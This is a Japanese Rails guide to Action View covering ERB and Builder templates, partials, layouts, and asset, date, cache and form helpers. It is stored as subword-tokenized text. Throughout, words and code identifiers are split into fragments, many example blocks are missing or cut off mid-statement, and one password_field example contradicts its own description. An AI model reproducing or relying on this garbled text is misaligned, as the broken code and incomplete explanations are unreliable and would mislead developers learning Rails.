▁Rails の ビュー には 命 名 規 則 があります 。
▁ 上で 生成された ファイル を見ると わかるように 、 ビュー テンプレート ファイルは 基本的に コントローラのアクション と 関連付け られ ています 。
▁これらの ERB ファイルに 、 それら を 内 包 する レイアウト テンプレート や 、 ビュー から 参 照 される あらゆる パーシャル ▁( 部分 テンプレート ) ▁ が 組 み 合 わ さ って 完全な HTML が生成され 、 クライアント に 送信 されます 。
▁ テンプレート 、 パーシャル 、 レイアウト
▁### ▁ テンプレート
▁Action ▁ View の テンプレート は さまざまな 方法で 記述 することができます 。
▁Rails では 複数の テンプレート システム が サポート され ており 、 テンプレート ファイルの 拡張子 で 区別 されます 。
▁たとえば 、 ERB テンプレート システム を使用する HTML ファイルの 拡張子 は ` . html . erb ` になります 。
▁#### ▁ ERB
▁ ERB テンプレート の 内部で は 、` < % ▁%> ` タグ や ` <%= ▁%> ` タグ に Ruby コード を含め ることができます 。
▁ 最初の ` < % ▁%> ` タグ は その 中に 書かれ た Ruby コード を実行します が 、 実行 結果 は 出力 されません 。 条件 文 や ル ー プ 、 ブロック など 出力 の 不要な 行 はこの タグ の中に 書く と よいでしょう 。 次の ` <%= ▁%> ` タグ では 実行 結果 が Web ページに 出力 されます 。
▁ 以下 は 、 名前 を出力する ための ル ー プ です 。
▁` ` ` html + erb
▁< h 1> Name s ▁of ▁ all ▁the ▁ people </ h 1>
▁<% ▁@ people . each ▁do ▁| person | ▁%>
▁ Name : ▁<%= ▁ person . name ▁% >< br >
▁ 以下のコード は 誤 り です 。
▁<% # ▁ 間 違 い ▁%>
▁ H i , ▁ M r . ▁<% ▁ put s ▁" F r o do " ▁%>
▁なお 、 Web ページ への 出力結果 の 最 初 と 最 後 から ホ ワ イ ト スペース を 取り 除 き たい場合は ` < % - ` ▁ および ▁` - % > ` を 通常の ` < % ` ▁ および ▁` % > ` と 交 互 に ご 使用 ください ▁( 訳 注 : ▁これは 英語 のような スペース 分 か ち 書き を行なう 言語 向け の ノ ウ ハ ウ です )。
▁#### ▁B u il de r テンプレート
▁B u il de r テンプレート は ERB の代わりに 使用できる 、 より プログラミング 向 き な 記 法 です 。
▁これは 特に XML コンテンツ の 生成 を 得 意 とします 。
▁ テンプレート の 拡張子 を ` . builder ` に すると 、` xml ` という名前の X m l M ar k up オブジェクトが 自動 で 使用 できるようになります 。
▁ 基本的な 例 を 以下 に いくつか 示 します 。
▁ xml . e m (" emph a size d ")
▁ xml . e m ▁ { ▁ xml . b (" emph ▁ & ▁ b ol d ") ▁ }
▁ xml . a (" A ▁ L in k ", ▁" href " ▁=> ▁" http :// rubyonrails . org ")
▁ xml . t ar get (" name " ▁=> ▁" compile ", ▁" option " ▁=> ▁" fa st ")
▁上のコード から 以下 が 生成されます 。
▁< e m > emph a size d </ e m >
▁< e m >< b > emph ▁ & am p ; ▁ b ol d </ b ></ e m >
▁< a ▁ href =" http :// rubyonrails . org "> A ▁ link </ a >
▁< t ar get ▁ option =" fa st " ▁name =" compile " ▁/>
▁ ブロック を 後 ろ に 伴 う メソッドは すべて 、 ブロック の中に ネスト した マークアップ を含む XML マークアップ タグ として 扱 わ れ ます 。
▁以下の 例 で 示 します 。
▁ xml . div ▁ {
▁ xml . h 1 (@ person . name )
▁ xml . p (@ person . b io )
▁上のコード の 出力 は 以下のような もの になります 。
▁< div >
▁< h 1> David ▁ H e in e me i er ▁ H an s s on </ h 1>
▁< p > A ▁ product ▁of ▁D an i sh ▁D e sign ▁d ur ing ▁the ▁ W in ter ▁of ▁' 7 9 ... </ p >
▁ 以下 は Base ca m p で 実際に 使用されている R S S 出力 コードを そのまま 引 用 した ものです 。
▁ xml . r s s (" version " ▁=> ▁" 2 . 0 ", ▁" xml n s : d c " ▁=> ▁" http :// p url . org / d c / e le m ent s /1 . 1 / ") ▁do
▁ xml . cha n n e l ▁do
▁ xml . title (@ feed _ title )
▁ xml . link (@ url )
▁ xml . de script ion ▁" Base ca m p : ▁ Re c ent ▁ item s "
▁ xml . lang u age ▁" en - us "
▁ xml . tt l ▁" 4 0 "
▁for ▁ item ▁in ▁@ re c ent _ item s
▁ xml . item ▁do
▁ xml . title ( item _ title ( item ) )
▁ xml . de script ion ( item _ de script ion ( item ) ) ▁if ▁ item _ de script ion ( item )
▁ xml . p ub Date ( item _ p ub Date ( item ) )
▁ xml . guid (@ person . fi rm . account . url ▁+ ▁@ re c ent _ item s . url ( item ) )
▁ xml . link (@ person . fi rm . account . url ▁+ ▁@ re c ent _ item s . url ( item ) )
▁ xml . tag ! ("
▁d c : creat or ", ▁ item . author _ name ) ▁if ▁ item _ has _ creat or ? (
▁#### ▁ テンプレート を キャッシュ する
▁Rails は 、 デフォルトで すべての ビュー テンプレート を コンパイル して メソッド 化 し 、 出力 に 備 え ます 。
▁ development モード の場合 、 ビュー テンプレート が変更され ると ファイルの 日付 で 変更 が 検出 され 、 再度 コンパイル されます 。
▁### ▁ パーシャル
▁ 部分 テンプレート または パーシャル は 、 出力 を 扱 い や す く 分割 するための 仕組み です 。
▁ パーシャル を使用することで 、 ビュー 内の コードを い く つ もの ファイルに 分割 して 書き 出 し 、 他の テンプレート でも 使い ま わ す ことができます 。
▁#### ▁ パーシャル の 命 名 ルール
▁<%= ▁render ▁" me n u " ▁%>
▁上の 呼び出し により 、` _ me n u . html . erb ` という名前の ファイル の内容 が 、 render メソッドを 書いた その 場所 で レンダリング されます 。
▁ パーシャル ファイル名 の 冒 頭 には アンダースコア が 付 い ている ことにご注意ください 。 これは 通常の ビュー と 区別 するために 付け られ ています 。 ただし render で 呼 び 出 す 際に はこの アンダースコア は 不要です 。
▁ 以下のように 、 他の フォルダ の下に ある パーシャル を呼び出す 際に も アンダースコア は 不要です 。
▁<%= ▁render ▁" shared / me n u " ▁%>
▁上のコードでは 、` app / views / shared / _ me n u . html . erb ` パーシャル を 読み 込 んで 使用します 。
▁#### ▁ パーシャル を 活用 して ビュー を 簡潔 に 保 つ
▁ すぐ に 思い 付 く パーシャル の 使い 方 と い えば 、 パーシャル を サブ ル ー チ ン と 同 等 の もの と み な す という の があります 。 ビュー の詳細 部分を パーシャル に移動し 、 コードの 見 通 し を 良 く するために 、 パーシャル を使う のです 。
▁たとえば 、 以下のような ビュー が あるとします 。
▁<%= ▁render ▁" shared / ad _ b an n er " ▁%>
▁< h 1> Product s </ h 1>
▁< p > H er e ▁are ▁a ▁f e w ▁of ▁ our ▁f in e ▁ products : </ p >
▁<%= ▁render ▁" shared / footer " ▁%>
▁上のコード の ` _ ad _ b an n er . html . erb ` パーシャル と ` _ footer . html . erb ` パーシャル に含まれる コンテンツ は 、 アプリケーションの 多くの ページ と 共有 できます 。
▁ ある ページを 開発 中 、 パーシャル の 部分 については 詳 細 を 気 に せずに 済み ます 。
▁#### ▁` as ` と ` object ` オプション
▁` ActionView :: P ar t i al s :: P ar t i al Re nder er ` は 、 デフォルトで テンプレート と同じ 名前 を持つ ローカル変数 の中に 自身 の オブジェクトを 持 ち ます 。
▁ 以下のコード を見てみましょう 。
▁<%= ▁render ▁ partial : ▁" product " ▁%>
▁上のコードでは 、 ローカル変数 である ` product ` の中に `@ product ` が 置かれます 。 これは 以下のコード と 同 等 の 結果 になります 。
▁` as ` オプションは 、 ローカル変数 の名前 を変更 したい場合 に 使用します 。
▁たとえば 、 ローカル変数 名を ` product ` ではなく ` item ` に したい のであれば 、 以下のように します 。
▁` object ` オプションは 、 パーシャル で 出力 する オブジェクト を直接 指定 したい場合 に 使用します 。 これは 、 テンプレート の オブジェクトが 他の 場所 ▁( 別の インスタンス変数 や 別の ローカル変数 ) ▁ にある 場合に 便利です 。
▁たとえば 、 以下のコード が あるとします 。
▁上のコード は以下のようになります 。
▁<%= ▁render ▁ partial : ▁" product ", ▁ object : ▁@ item ▁%>
▁` object ` オプション と ` as ` オプションは 同時に 使用 することもできます 。
▁#### ▁ コレクション を出力する
▁ すべての 製 品 ( products ) を出力する コード 例 は以下のようになります 。
▁上のコードは 以下のように 1 行 で 書 け ます 。
▁ コレクション 出力 には 短縮 記 法 があります 。
▁ `@ products ` が ` Product ` インスタンス の コレクション であれば 、 以下のコード でも 同じ 結果を 得られ ます 。
▁<%= ▁render ▁@ products ▁%>
▁ 使用される パーシャル 名 は 、 コレクション の中に ある 「 モデル名 」 を参照 して 決 定 されます 。 この場合 の モデル名 は ` Product ` です 。
▁#### ▁ ス ペ ー サ ー テンプレート
▁`: space r _ template ` オプション を使用すると 、 主要な パーシャル 同士 の 間 を 埋 め る 第 二 の パーシャル を指定する ことができます 。
▁<%= ▁render ▁ partial : ▁@ products , ▁ space r _ template : ▁" product _ r ul er " ▁%>
▁### ▁ レイアウト
▁Rails における 「 レイアウト 」 は 、 多くの コントローラのアクション に わ た って 共通 して 使用できる テンプレート の ことです 。
▁ ログイン した ユーザー 向け の レイアウト であれば 、 ナビゲーション ツール バー を ページの ト ッ プ レベル に 表示 し 、 多くの コントローラ / アクション で 共通 して 使用 できるように する でしょう 。
▁ レイアウト ごとに 異なる 外 観 を 設定 して これら を 使い 分 け ることができます 。
▁ レイアウト と レンダリング
▁ パーシャル レイアウト
▁ パーシャル に 独自の レイアウト を 適 用 することができます 。
▁<%= ▁ yield ▁%>
▁< p >
▁上のコード の 出力 は以下のようになります 。
▁< p >
▁ただし 、 アプリケーション 全体 で 共通 の レイアウト とは 異 なり 、 パーシャル レイアウト の ファイル名 冒 頭 には アンダースコア が必要です 。
▁` yield ` を呼び出す 代わりに 、 パーシャル レイアウト 内に ある コードの ブロック を出力する こともできます 。
▁<% ▁end ▁%>
▁ここでは 、 同じ ` _ box ` パーシャル を使用する 前 提 であり 、 先 の例 と同じ 出力 が 得られ ます 。
▁ ビュー の パス
▁( 執 筆 予 定 )
▁Action ▁ View が提供する ヘルパー の概要
▁ ----------- ---------------- ----------------
▁ W I P : ▁この リスト に まだ 含 まれ ていない ヘルパー があります 。
▁ 完全な リスト については [ API ドキュメント ]( http :// api . rubyonrails . org / classes / ActionView / Helper s . html ) を参照してください 。
▁Action ▁ View で 利用できる ヘルパー の概要 を以下に示します 。
▁[ API ドキュメント ]( http :// api . rubyonrails . org / classes / ActionView / Helper s . html ) ▁ も 参 照 して 調 べ 直 す ことをお勧めします 。 API ドキュメント には すべての ヘルパー の詳細 が 記 載 され ており 、 本 ガイド は 概 要 を 把 握 する ためのものです 。
▁### ▁Record T a g Helper
▁この モジュール は 、` div ` などの コ ン テ ナ タグ を生成する メソッド を提供します 。
▁Active ▁Record オブジェクトを 出力 するための コ ン テ ナ 作成 方法 には これ を使う ことをお勧めします 。 この 方法 であれば 、 適切な クラス と id 属性 が コ ン テ ナ に追加 される からです 。
▁これにより 、 これらの コ ン テ ナ を 通常の 方法で 簡単に 参 照 でき 、 どの クラス や どの id 属性 を使用 すべき かどうかを 考え ずに 済み ます 。
▁#### ▁ content _ tag _ for
▁Active ▁Record オブジェクト に 関連付け られ る コ ン テ ナ タグ を 出力 します 。
▁たとえば
▁上のコード によって 以下の HTML が 生成されます 。
▁< td > Hello ▁ W or l d !
▁</ tr >
▁ オプション の ハッシュ を追加する ことで 、 HTML 属性 を指定する こともできます 。
▁上のコード によって 以下の HTML が 生成されます 。
▁Active ▁Record オブジェクトの コレクション を 渡す こともできます 。
▁< td > Ruby ▁on ▁Rails ▁ R ock s !
▁#### ▁ div _ for
▁このメソッドは 内部で ` content _ tag _ for ` を 呼び出し て `: div ` を タグ 名 に し てくれる 、 便利な メソッド です 。
▁Active ▁Record オブジェクトを 単 体 または コレクション として 渡す ことができます 。
▁### ▁ Asset T a g Helper
▁この モジュール は 、 画像 ・ JavaScript ファイル ・ スタイルシート ・ フィード などの アセット に ビュー を リンク する HTML を生成する メソッド を提供します 。
▁ デフォルトで は 、 現在 ホスト されている public フォルダ 内の アセット に対して リンク します が 、 アプリケーション 設定 ▁( 通常 は ` config / environments / production . rb ` ) ▁ の ` config . action _ controller . asset _ host ` で 設定 されている アセット 用 サーバー に リンク することもできます 。
▁たとえば 、` assets . example . com ` という アセット 専 用 ホスト を使用した い とします 。
▁config . action _ controller . asset _ host ▁= ▁" assets . example . com "
▁ image _ tag (" rails . png ") ▁# ▁=> ▁< im g ▁src =" http :// assets . example . com / images / rails . png " ▁ alt =" Rails " ▁/>
▁#### ▁ auto _ d is co ver y _ link _ tag
▁ ブラウザ や フィード リ ー ダ ー が 検出 可能な R S S フィード や A to m フィード の リンク タグを返します 。
▁#### ▁ image _ path
▁` app / assets / images ` に置かれている 画像 アセット への パス を 算 出 します 。
▁ ドキュメント ルート ・ ディレクトリ から の 完全な パス が返されます 。
▁このメソッド の 内部で は 画像 への パス 作成 に ` image _ tag ` が 使用 されています 。
▁ image _ path (" edit . png ") ▁# ▁=> ▁ / assets / edit . png
▁config . assets . digest が true に 設定 されている 場合 、 ファイル名 に フィンガープリント が追加され ます 。
▁ image _ path (" edit . png ") ▁# ▁=> ▁ / assets / edit - 2 d 1 a 2 db 6 3 f c 7 3 8 6 9 00 2 1 f e db 5 a 6 5 b 6 8 e . png
▁#### ▁ image _ url
▁` app / assets / images ` に置かれている 画像 アセット への URL を 算 出 します 。
▁このメソッドは 内部で ` image _ path ` を 呼び出し ており 、 現在の ホスト または アセット 用の ホスト と マージ して URL を生成します 。
▁ image _ url (" edit . png ") ▁# ▁=> ▁ http :// www . example . com / assets / edit . png
▁#### ▁ image _ tag
▁ 画像 への フル パス 、 または ` app / assets / images ` ディレクトリ 内に ある ファイルを 引数として 与え られます 。
▁ image _ tag (" i con . png ") ▁# ▁=> ▁< im g ▁src =" / assets / i con . png " ▁ alt =" I con " ▁/>
▁#### ▁ javascript _ include _ tag
▁` app / assets / javascripts ` ディレクトリ にある JavaScript ファイル名 ▁( 拡張子 ` . js ` は あって も なくても 構 いません ) ▁ を 引数として 渡す ことができます 。 この 結果 は 現在の ページに インクルード されます 。 ドキュメント ルート から の 相 対 完 全 パス を 渡す こともできます 。
▁ javascript _ include _ tag ▁" com m on " ▁# ▁=> ▁< script ▁src =" / assets / com m on . js " ></ script >
▁ アプリケーションで アセットパイプライン を使用 せずに j Query ▁ JavaScript ライブラリ を インクルード する 場合は 、 ソース として `: default s ` を渡して ください 。
▁`: default s ` を 指定 した 場合 、` app / assets / javascripts ` ディレクトリ に ` application . js ` という ファイル があれば これ も インクルード されます 。
▁ javascript _ include _ tag ▁: default s
▁ ソース に `: all ` を指定すると 、` app / assets / javascripts ` ディレクトリ 以下 にある JavaScript ファイル をすべて インクルード できます 。
▁ javascript _ include _ tag ▁: all
▁ 複数の JavaScript ファイルを キャッシュ して 1 つの ファイルに することができます 。 こうすることで JavaScript ファイルの ダウンロード に 必要な HTTP 接続 数 を 減 ら す ことができ 、 速 度 が 向 上 します 。 g z ip 圧 縮 すれば さらに 転 送 が 速 く なります 。
▁ キャッシュ が 有効 になる のは 、` ActionController :: Base . perform _ ca ch ing ` を true に設定し た場合 のみ です 。 production 環境で はデフォルトで true になります が 、 development 環境で はデフォルトで は true になり ません 。
▁ javascript _ include _ tag ▁: all , ▁ cache : ▁true ▁# ▁=>
▁< script ▁src =" / javascripts / all . js " ></ script >
▁#### ▁ javascript _ path
▁` app / assets / javascripts ` に置かれている JavaScript アセット への パス を 算 出 します 。
▁ ソース の ファイル名 に 拡張子 ` . js ` が ない場合は 自動的に 補 わ れ ます 。
▁ スクリプト パス 作成 のために 内部で ` javascript _ include _ tag ` が 使用 されています 。
▁ javascript _ path ▁" com m on " ▁# ▁=> ▁ / assets / com m on . js
▁#### ▁ javascript _ url
▁` app / assets / javascripts ` に置かれている JavaScript アセット への URL を 算 出 します 。
▁このメソッドは 内部で ` javascript _ path ` を 呼び出し ており 、 現在の ホスト または アセット 用の ホスト と マージ して URL を生成します 。
▁ javascript _ url ▁" com m on " ▁# ▁=> ▁ http :// www . example . com / assets / com m on . js
▁#### ▁ stylesheet _ link _ tag
▁ 引数として 指定された ソース にある スタイルシート へのリンク タグを返します 。
▁ 拡張子 が 指定 されていない 場合は 、` . css ` が自動的に 補 わ れ ます 。
▁ stylesheet _ link _ tag ▁" application " ▁# ▁=> ▁< link ▁ href =" / assets / application . css " ▁ media =" sc re en " ▁ re l =" stylesheet " ▁/>
▁ ソース に `: all ` を指定すると 、 stylesheet ディレクトリ にある すべての スタイルシート を含め ることができます 。
▁ stylesheet _ link _ tag ▁: all
▁ 複数の スタイルシート ファイルを キャッシュ して 1 つの ファイルに することができます 。 こうすることで スタイルシート ファイルの ダウンロード に 必要な HTTP 接続 数 を 減 ら す ことができ 、 速 度 が 向 上 します 。 g z ip 圧 縮 すれば さらに 転 送 が 速 く なります 。
▁ キャッシュ が 有効 になる のは 、` ActionController :: Base . perform _ ca ch ing ` を true に設定し た場合 のみ です 。 production 環境で はデフォルトで true になります が 、 development 環境で はデフォルトで は true になり ません 。
▁ stylesheet _ link _ tag ▁: all , ▁ cache : ▁true
▁# ▁=> ▁< link ▁ href =" / assets / all . css " ▁ media =" sc re en " ▁ re l =" stylesheet " ▁/>
▁#### ▁ stylesheet _ path
▁` app / assets / stylesheets ` に置かれている スタイルシート アセット への パス を 算 出 します 。
▁ ソース の ファイル名 に 拡張子 ` . css ` が ない場合は 自動的に 補 わ れ ます 。
▁このメソッド の 内部で は スタイルシート への パス 作成 に ` stylesheet _ link _ tag ` が 使用 されています 。
▁ stylesheet _ path ▁" application " ▁# ▁=> ▁ / assets / application . css
▁#### ▁ stylesheet _ url
▁` app / assets / stylesheets ` に置かれている スタイルシート アセット への URL を 算 出 します 。
▁このメソッドは 内部で ` stylesheet _ path ` を 呼び出し ており 、 現在の ホスト または アセット 用の ホスト と マージ して URL を生成します 。
▁ stylesheet _ url ▁" application " ▁# ▁=> ▁ http :// www . example . com / assets / application . css
▁### ▁A to m F e ed Helper
▁#### ▁a to m _ feed
▁この ヘルパー を使用して 、 A to m フィード を簡単に 生成 できます 。
▁ 以下 に すべての 使用 例 を示します 。
▁** config / routes . rb **
▁def ▁ index
▁ respond _ to ▁do ▁| format |
▁ format . html
▁ format . a to m
▁a to m _ feed ▁do ▁| feed |
▁ ent ry . author ▁do ▁| author |
▁### ▁B en ch m ar k Helper
▁#### ▁be n ch m ar k
▁ テンプレート 内の 1 つの ブロック の 実行 時間 測 定 と 、 結果 の ログ 出力 に 使用します 。
▁ 実行 に 時間 のか か る 行 や 、 ボ ト ル ネ ッ ク になる 可能性 のある 行 を この ブロック で 囲 み 、 実行 に か か った 時間 を 読み 取り ます 。
▁<% ▁be n ch m ar k ▁" Proc ess ▁ data ▁ file s " ▁do ▁%>
▁<%= ▁ ex p en s ive _ file s _ o per ation ▁%>
▁上のコードは 、 " Proc ess ▁ data ▁ file s ▁( 0 . 3 4 5 23 ) " のような ログ を 出力 します 。 この ログ は 、 コード 最適化 のために タ イ ミ ング を 比 較 する 際に 役 立 て ることができます 。
▁### ▁ Cache Helper
▁#### ▁ cache
▁` cache ` メソッドは 、 ( アクション 全体 や ページ 全体 ではなく ) ▁ ビュー の 断 片 を キャッシュ する メソッド です 。
▁この 手法 は 、 メニュー ・ ニ ュ ー ス 記事 ・ 静 的 HTML の 断 片 など を キャッシュ するのに 便利です 。
▁このメソッド には 、 キャッシュ したい コンテンツ を 1 つの ブロック に含め て 引数として 渡します 。
▁詳細については 、` ActionController :: C a ch ing :: F r a g m ent s ` を参照してください 。
▁<% ▁ cache ▁do ▁%>
▁<%= ▁render ▁" shared / footer " ▁%>
▁### ▁C a p t ur e Helper
▁#### ▁ ca p t ur e
▁` ca p t ur e ` メソッド を使用することで 、 テンプレート の一部 を 変数 に保存 することができます 。
▁ 保存 された 変数 は 、 テンプレート や レイアウト の どんな 場所 でも 自由に 使用できます 。
▁<% ▁@ g re e t ing ▁= ▁ ca p t ur e ▁do ▁%>
▁< p > Welcome !
▁ The ▁ date ▁and ▁ time ▁is ▁<%= ▁ Time . now ▁%></ p >
▁ 上で キ ャ プ チ ャ した 変数 は 以下のように 他の 場所 で 自由に 使用できます 。
▁< html >
▁< head >
▁< title > Welcome !
▁</ head >
▁< body >
▁<%= ▁@ g re e t ing ▁%>
▁</ body >
▁</ html >
▁#### ▁ content _ for
▁` content _ for ` を呼び出す と 、 後 の 利用 に 備 え て 、 id に対応する マークアップ の ブロック が 保存されます 。
▁ 以後 、 保存 された コンテンツ を 他の テンプレート や レイアウト で 呼 び 出 す ことができます 。 呼び出し の 際に は 、` yield ` の 引数 となる id を 渡します 。
▁たとえば 、 ある Rails アプリケーション 全体 に わ た って 標準 の アプリケーション レイアウト を 使用している が 、 特定の ページ で のみ 特定の JavaScript コードが 必要 と なり 、 他の ページ では この JavaScript は まったく 不 要 で あるとします 。
▁ このような ときに は ` content _ for ` を使用します 。 これにより 、 その JavaScript コードを 特定の ページに だけ インクルード し 、 サイトの 他の 部分 で インクルード される こと の ないように できます 。
▁** app / views / layouts / application . html . erb **
▁<%= ▁ yield ▁: special _ script ▁%>
▁< p > Welcome !
▁< p > T h is ▁is ▁a ▁ special ▁ page . </ p >
▁<% ▁ content _ for ▁: special _ script ▁do ▁%>
▁< script > alert (' Hello ! ')
▁### ▁ Date Helper
▁#### ▁ date _ select
▁ 日付 用の select タグ の セット を返します 。 タグ は 年 ・ 月 ・ 日 用 に それぞれ あり 、 日付 に関する 特定の 属性 にアクセス して 年 月 日 を 選択 済み の 状態 に します 。
▁#### ▁ date time _ select
▁ 日付 ・ 時刻 用の select タグ の セット を返します 。 タグ は 年 ・ 月 ・ 日 ・ 時 ・ 分 用 に それぞれ あり 、 日付 ・ 時刻 に関する 特定の 属性 にアクセス して 日 時 が 選択 済み になります 。
▁#### ▁d ist an ce _ of _ time _ in _ word s
▁ Time オブジェクト や Date オブジェクト 、 秒 を表す 整 数 同士 を 比 較 して 近 似 表現 を返します 。
▁` include _ sec on d s ` を true に すると 、 より 詳 細 な 差 を 得られ ます 。
▁d ist an ce _ of _ time _ in _ word s ( Time . now , ▁ Time . now ▁+ ▁ 15 . sec on d s , ▁ include _ sec on d s : ▁true ) ▁# ▁=> ▁ less ▁ th an ▁20 ▁ sec on d s
▁#### ▁ select _ date
▁# ▁ 指定された 日付 ▁( ここでは 本 日 から 6 日 後 ) ▁ を デフォルト値 と する 日付 セレクト ボックス を生成する
▁ select _ date ( Time . to day ▁+ ▁ 6 . day s )
▁# ▁ 日付 の 指定 が ない場合 、 本 日 を デフォルト値 と する 日付 セレクト ボックス を生成する
▁ select _ date ( )
▁#### ▁ select _ date time
▁# ▁ 指定された 日 時 ▁( ここでは 本 日 から 4 日 後 ) ▁ を デフォルト値 と する 日 時 セレクト ボックス を生成する
▁ select _ date time ( Time . now ▁+ ▁4 . day s )
▁# ▁ 日 時の 指定 が ない場合 、 本 日 を デフォルト値 と する 日 時 セレクト ボックス を生成する
▁ select _ date time ( )
▁#### ▁ select
▁1 から 3 1 まで の 日付 を オプション に 持 ち 、 当 日 が 選択 されている select タグを返します 。
▁# ▁ 指定された 日付 を デフォルト値 に 持つ セレクト ボックス を生成する
▁# ▁ 指定された 数値 を デフォルトの 日付 として 持つ セレクト ボックス を生成する
▁0 から 23 まで の 時 を オプション に 持 ち 、 現在 時刻 が 選択 されている select タグを返します 。
▁# ▁ 指定された 分 を デフォルト値 として 持つ セレクト ボックス を生成する
▁ J an u ary から D e ce m b er まで の 月 を オプション に 持 ち 、 現在の 月 が 選択 されている select タグを返します ( 訳 注 : ▁ 日 本 語 環境で は 1 月 から 12 月 が表示されます )。
▁# ▁ 現在の 月 を デフォルト値 に 持つ セレクト ボックス を生成する
▁0 から 59 まで の 秒 を オプション に 持 ち 、 現在 時刻 の 秒 が 選択 されている select タグを返します 。
▁# ▁ 現在 時刻 を デフォルト値 に 持つ 時刻 セレクト ボックス を生成する
▁`: start _ year ` キー と `: end _ year ` キー を ` options ` に設定する ことで 、 デフォルトの 5 年 を変更 できます 。
▁# ▁ 今 年 を デフォルト値 に 持 ち 、 Date . to day で 得られ た 日 の 前 後 5 年 を オプション に 持つ セレクト ボックス を生成する
▁# ▁ 今 年 を デフォルト値 に 持 ち 、 19 00 年 から 200 9 年 まで を オプション に 持つ セレクト ボックス を生成する
▁` d ist an ce _ of _ time _ in _ word s ` と 基本的に 同じ 動作 であり 、` to _ time ` の 部分 が ` Time . now ` に 固定 されている 点 だけ が 異なります 。
▁ 時刻 用の select タグ の セット を返します 。 タグ は 時 ・ 分 用の 他 に オプション で 秒 もあります 。 時刻 に関する 特定の 属性 にアクセス して 日 時 が 選択 済み になります 。
▁この タグ で 選択 された 項目 は 、 Active ▁Record オブジェクト に マ ル チ パラメータ として 割り当て 可能な 形式 になります 。
▁# ▁ 時刻 選択 用 タグ を作成する 。 フォーム が POST される と 、 submit t ed 属性 の order 変数 が 保存 される 。
▁ Y A M L から ダ ン プ した オブジェクト を含む ` pre ` タグを返します 。
▁ my _ hash ▁= ▁ { ' first ' ▁=> ▁1, ▁' sec on d ' ▁=> ▁' two ', ▁' th ir d ' ▁=> ▁[1, 2, 3 ]}
▁ debug ( my _ hash )
▁< pre ▁class =' debug _ d um p ' > - - -
▁ first : ▁1
▁ sec on d : ▁ two
▁ th ir d :
▁</ pre >
▁### ▁ Form Helper
▁ フォーム ヘルパー を使用すると 、 標準 の HTML 要素 だけ を使用する よりも は る か に 容易に 、 モデルと 連 携 動作する フォーム を作成する ことができます 。
▁ Form ヘルパーは フォーム 用の HTML を生成し 、 テキスト や パスワード といった 入力 の 種類 に 応 じ た メソッド を提供します 。
▁( 送信 ボタン が クリック された り 、 JavaScript で form . submit を呼び出す など して ) ▁ フォーム が 送信 される と 、 フォームの 入力 内容 は params オブジェクト に まとめ て 保存 され 、 コントローラ に渡され ます 。
▁ フォーム ヘルパーは 、 モデル 属性 の 操作 に 特 化 した もの と 、 より 一般的な もの の 2 種類 に 分 類 できます 。
▁ここでは モデル 属性 の 扱 い に 特 化 した もの について説明し ます 。 モデル 属性 に 特 化 していない 一般的な フォーム ヘルパー については 、 ActionView :: Helper s :: Form T a g Helper の ドキュメント を参照してください 。
▁ここで 扱 う フォーム ヘルパー の 中 心 となる メソッドは form _ for です 。 このメソッドは モデルの インスタンス から フォーム を作成する ことができます 。 たとえば 、 以下のように Person という モデル があり 、 この モデル を も と に して インスタンス を 1 つ 作成する とします 。
▁# ▁ メ モ : ▁a ▁@ person 変数 は コントローラ 側 で 設定 済み である と する ▁ (@ person ▁= ▁ Person . new など )
▁<%= ▁ form _ for ▁@ person , ▁ url : ▁ { action : ▁" create "} ▁do ▁| f | ▁%>
▁<%= ▁f . text _ field ▁: first _ name ▁%>
▁<%= ▁f . text _ field ▁: last _ name ▁%>
▁<%= ▁ submit _ tag ▁' Create ' ▁%>
▁上のコード によって 生成される HTML は以下のようになります
▁< form ▁ action =" / people / create " ▁ method =" post ">
▁< input ▁id =" person _ first _ name " ▁name =" person [ first _ name ] " ▁type =" text " ▁/>
▁< input ▁id =" person _ last _ name " ▁name =" person [ last _ name ] " ▁type =" text " ▁/>
▁< input ▁name =" commit " ▁type =" submit " ▁ value =" Create " ▁/>
▁上の フォーム が 送信 される 時に 作成される params オブジェクト は以下のようになります 。
▁ { " action " ▁=> ▁" create ", ▁" controller " ▁=> ▁" people ", ▁" person " ▁=> ▁ { " first _ name " ▁=> ▁" W il li am ", ▁" last _ name " ▁=> ▁" S m i th "} }
▁上の params ハッシュ には 、 Person モデル 用の 値が ネスト した 形 で 含 まれ ている ので 、 コントローラ で ` params [: person ] ` と 書くこと で 内容 にアクセス できます 。
▁#### ▁ check _ box
▁ 指定された 属性 にアクセス するための チェックボックス タグ を生成します 。
▁#### ▁ field s _ for
▁ form _ for のような 特定の モデル オブジェクトの 外 側 に スコープ を作成します が 、 フォーム タグ 自体 は 作成 しません 。
▁ このため 、 field s _ for は 同じ フォーム に 別の モデル オブジェクト を追加する の に 向 い ています 。
▁<%= ▁ form _ for ▁@ person , ▁ url : ▁ { action : ▁" update "} ▁do ▁| person _ form | ▁%>
▁F ir st ▁name : ▁<%= ▁ person _ form . text _ field ▁: first _ name ▁%>
▁ L a st ▁name ▁: ▁<%= ▁ person _ form . text _ field ▁: last _ name ▁%>
▁<%= ▁ field s _ for ▁@ person . per m is s ion ▁do ▁| per m is s ion _ field s | ▁%>
▁ Admin ? ▁: ▁<%= ▁ per m is s ion _ field s . check _ box ▁: admin ▁%>
▁#### ▁ file _ field
▁ 特定の 属性 にアクセス するための 、 ファイル アップロード 用 input タグを返します 。
▁ file _ field (: user , ▁: a v at ar )
▁# ▁=> ▁< input ▁type =" file " ▁id =" user _ a v at ar " ▁name =" user [ a v at ar ] " ▁/>
▁#### ▁ form _ for
▁ フィールド に ど のような 値 がある か を 問 い 合わせ る の に 使用される 、 特定の モデル オブジェクトの 外 側 に フォーム を 1 つ と スコープ を 1 つ 作成 します 。
▁<%= ▁f . label ▁: title , ▁' T it le ' ▁%> :
▁<%= ▁f . text _ field ▁: title ▁% >< br >
▁<%= ▁f . label ▁: body , ▁' B o d y ' ▁%> :
▁<%= ▁f . text _ ar e a ▁: body ▁% >< br >
▁#### ▁ h id de n _ field
▁ 特定の 属性 にアクセス するための 、 隠 された input タグを返します 。
▁ h id de n _ field (: user , ▁: token )
▁# ▁=> ▁< input ▁type =" h id de n " ▁id =" user _ token " ▁name =" user [ token ] " ▁ value =" # {@ user . token } " ▁/>
▁#### ▁ label
▁ 特定の 属性 用の input フィールド に 与え る ラ ベ ル を返します 。
▁#### ▁ password _ field
▁ 特定の 属性 にアクセス するための 、 種類 が " password " の input タグを返します 。
▁ password _ field (: login , ▁: pass )
▁# ▁=> ▁< input ▁type =" text " ▁id =" login _ pass " ▁name =" login [ pass ] " ▁ value =" # {@ login . pass } " ▁/>
▁#### ▁ r ad io _ button
